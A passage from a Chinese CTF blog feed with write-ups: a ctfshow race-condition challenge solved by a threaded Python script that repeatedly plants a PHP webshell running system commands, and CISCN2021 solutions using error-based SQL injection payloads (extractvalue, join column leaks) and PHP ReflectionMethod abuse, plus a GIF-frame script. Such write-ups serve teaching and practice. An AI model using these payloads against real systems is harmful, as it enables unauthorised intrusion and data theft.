class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$files</span> = scandir(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br>file_put_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br><br><span class="hljs-variable">$files</span> = scandir(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>使用bp不断访问并传参，然后开一个去不断访问 1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ctf=<span class="hljs-number">1.</span>php<br>show=<span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;tac /c*&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用脚本实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>url = <span class="hljs-string">&quot;http://ae3929ad-8f8f-4dc5-88c9-511d15e5625d.chall.ctf.show:8080/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>():</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        data = &#123;<br>            <span class="hljs-string">&#x27;show&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php system(&quot;ls /&quot;);?&gt;&#x27;</span><br>        &#125;<br>        W_reponse = requests.post(url+<span class="hljs-string">&quot;?ctf=1.php&quot;</span>,data=data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>():</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        R_reponse = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>        <span class="hljs-keyword">if</span> R_reponse.status_code != <span class="hljs-number">404</span>:<br>            print(R_reponse.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&#x27;[*]continued&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 通过threading.Event()可以创建一个事件管理标志，该标志（event）默认为False</span><br>    event = threading.Event()<br>    <span class="hljs-comment"># 将event的标志设置为True，调用wait方法的所有线程将被唤醒；</span><br>    event.<span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        threading.Thread(target=write).start()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        threading.Thread(target=read).start()<br></code></pre></td></tr></table></figure><p>跑脚本，发现了ctfshow_fl0g_here.txt文件<br><img src="https://img-blog.csdnimg.cn/20210425193008262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>修改为cat /ctfshow_fl0g_here.txt继续跑脚本，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210425193100247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html"> &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h2 id=&quot;0x00-条件竞争&quot;&gt;&lt;a href=&quot;#0x00-条件竞争&quot; class=&quot;headerlink&quot; title=&quot;0x00-条件竞争&quot;&gt;&lt;/a&gt;0x00-条件竞争&lt;/h2&gt;&lt;p&gt;条件竞争漏洞是一种服务器端的漏洞，由于服务器</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="漏洞" scheme="https://swhat.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2021赛后复现</title>
    <link href="https://swhat.github.io/2021/05/21/CISCN2021%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://swhat.github.io/2021/05/21/CISCN2021%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-05-21T14:26:42.000Z</published>
    <updated>2021-08-15T03:59:06.416Z</updated>
    
    <content type="html"><![CDATA[ <a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="esay-sql"><a href="#esay-sql" class="headerlink" title="esay_sql"></a>esay_sql</h2><p>输入单引号报错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;</span><span class="hljs-string">&#x27;123456&#x27;</span><span class="hljs-string">&#x27;) LIMIT 0,1&#x27;</span> at line <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/4903b7830329ec519a9add06ecbd160d.png" alt="image-20210515182436750"><br>sqlmap跑了一下，可以使用报错注入</p><p>1.爆库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,database(),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#XPATH syntax error: &#x27;</span>~security~<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>2.爆表名</p><p>猜测表名为flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from flag),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Operand should contain 1 column(s)</span><br></code></pre></td></tr></table></figure><p>3.爆列名</p><p>过滤了information_schema函数，可以使用join 无列名注入</p><p>得到id列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag )b),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Duplicate column name &#x27;</span>id<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>得到no列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from (select * from flag join flag as a using(id))b),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Duplicate column name &#x27;</span>no<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>得到ea1235fa-d397-474b-8188-dedbe352ffc7列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from (select * from flag join flag as a using(id,no))b),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Duplicate column name &#x27;</span>ea1235fa-d397<span class="hljs-number">-474</span>b<span class="hljs-number">-8188</span>-dedbe352ffc7<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>4.爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select `ea1235fa-d397-474b-8188-dedbe352ffc7` from flag),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#XPATH syntax error: &#x27;</span>~CISCN&#123;tJ1mc-jgoXW-qiG07-oHt4u-s<br></code></pre></td></tr></table></figure><p>因为报错注入限制只能读取一半flag，用right读取右半部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,right((select `ea1235fa-d397-474b-8188-dedbe352ffc7` from flag),20),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#XPATH syntax error: &#x27;</span>~-qiG07-oHt4u-shqSb-&#125;~<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/b33f074e5d8a9425d7463e89e4510ba4.png" alt="image-20210515184620854"><br>消去重复部分，最终flag为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">CISCN&#123;tJ1mc-jgoXW-qiG07-oHt4u-shqSb-&#125;<br></code></pre></td></tr></table></figure><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>一道原题，参考<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">wp</a>复现的<br>题目描述：你知道开发一个php程序很重要的东西是什么吗（flag在你看不到的地方）</p><p>最重要的就是备份，访问.index.php.swo得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs php">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">c</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">g</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">h</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">i</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">j</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">k</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">l</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">m</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">n</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">o</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">p</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">q</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">r</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">t</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-variable">$rc</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rc&quot;</span>];<br><span class="hljs-variable">$rb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rb&quot;</span>];<br><span class="hljs-variable">$ra</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ra&quot;</span>];<br><span class="hljs-variable">$rd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rd&quot;</span>];<br><span class="hljs-variable">$method</span>= <span class="hljs-keyword">new</span> <span class="hljs-variable">$rc</span>(<span class="hljs-variable">$ra</span>, <span class="hljs-variable">$rb</span>);<br>var_dump(<span class="hljs-variable">$method</span>-&gt;<span class="hljs-variable">$rd</span>());<br></code></pre></td></tr></table></figure><p>根据提示，本题就这一个文件，而且提示看到的不完全，猜测 flag被注释了，而且在类中被注释了。</p><p>需要GET提交四个参数，可以实例化任意类，并调用类方法。利用 PHP内置类中的 ReflectionMethod 来读取 User 类里面各个函数的注释</p><p>本地测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//pubLic $b = 100;</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Increment counter</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@final</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@static</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@access</span>  publicCISCN&#123;test&#125;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span>  int</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-string">&#x27;User&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>);<br>var_dump(<span class="hljs-variable">$d</span>-&gt;getDocComment());<br><br></code></pre></td></tr></table></figure><p>运行结果如下：<br><img src="https://img-blog.csdnimg.cn/20210516141112739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>源码中有26个函数，flag在某个函数的注释中，构造Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment<br></code></pre></td></tr></table></figure><p>抓包，爆破rb参数的值，从a-z开始爆破，最终在q的注释中找到flag<br><img src="https://img-blog.csdnimg.cn/20210516141137899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h2><p>使用脚本进行gif分帧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_name = <span class="hljs-string">&#x27;running_pixel.gif&#x27;</span><br><span class="hljs-comment"># 使用Image模块的open()方法打开gif动态图像时，默认是第一帧</span><br>im = Image.<span class="hljs-built_in">open</span>(file_name)<br><span class="hljs-comment"># 定义存储图片的文件名与读取的GIF图片名一致</span><br>file_save = file_name[:-<span class="hljs-number">4</span>]<br><span class="hljs-comment"># 在同级目录下创建存放每帧图片的文件夹</span><br><span class="hljs-comment"># 创建一级目录：os.mkdir(&#x27;D:\\gif1&#x27;)   创建多级目录：os.makedirs(&#x27;D:\\gif1\\gif1&#x27;)</span><br>os.mkdir(file_save)<br><span class="hljs-keyword">try</span>:<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 保存当前帧图片</span><br>    <span class="hljs-comment"># 获取当前文件的位置(GIF图的帧数)</span><br>    frame_number= im.tell()<br>    <span class="hljs-comment"># 保存图片，格式为png</span><br>    im.save(file_save+<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-built_in">str</span>(frame_number)+<span class="hljs-string">&#x27;.png&#x27;</span>)<br>    <span class="hljs-comment"># 获取下一帧图片</span><br>    im.seek(frame_number+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">except</span> EOFError:<br>    <span class="hljs-keyword">pass</span><br>print(<span class="hljs-string">&quot;共:&quot;</span>, frame_number, <span class="hljs-string">&quot;张图片&quot;</span>)<br></code></pre></td></tr></table></figure><p>参考<a href="https://mochu.blog.csdn.net/article/details/116855242">末初</a>师傅的wp</p><p>PS打开打开几张图片查看，有可疑白点，像素块为<code>RGB: (233,233,233)</code>，其他图片中也发现了这个像素块<br><img src="https://img-blog.csdnimg.cn/20210521203038633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取382张图片的像素块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>flag_img = Image.new(<span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-number">400</span>,<span class="hljs-number">400</span>))<br><span class="hljs-comment">#mode=1 1位黑白像素，每字节存储一个像素</span><br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">381</span>):<br>    framepic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;./running_pixel/<span class="hljs-subst">&#123;name&#125;</span>.png&quot;</span>)<br>    